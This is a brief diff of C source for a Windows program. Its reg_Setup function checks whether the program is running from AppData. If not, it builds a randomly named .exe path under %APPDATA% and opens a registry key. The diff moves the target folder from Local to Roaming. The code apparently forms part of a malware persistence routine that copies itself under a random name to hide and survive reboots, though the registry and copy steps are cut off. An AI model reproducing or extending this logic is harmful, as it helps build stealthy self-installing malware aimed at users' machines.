@@ -10,17 +10,17 @@ int reg_Setup(void)
 {	
 	if(GetModuleFileName(NULL, prog_globalPath, 256))
 	{
-		if(strstr(prog_globalPath, "AppData\\Local\\") != NULL) //v papkata appdata e
+		if(strstr(prog_globalPath, "AppData\\Roaming") != NULL) //v papkata appdata e
 		{
 			return 0;
 		}
 
 		char* appPath = getenv("APPDATA");
 		char* randName = random_Ascii(10);
-		int pathLen = strlen(appPath) + strlen(randName) + 4 + strlen("\\..\\Local\\") + sizeof(char); // +4 ".exe"
+		int pathLen = strlen(appPath) + strlen(randName) + 5 + sizeof(char);
 		char* newPath = malloc(pathLen);
 
-		snprintf(newPath, pathLen, "%s\\..\\Local\\%s.exe", appPath, randName);
+		snprintf(newPath, pathLen, "%s\\%s.exe", appPath, randName);
 		free(randName);
 
 		HKEY hkey;
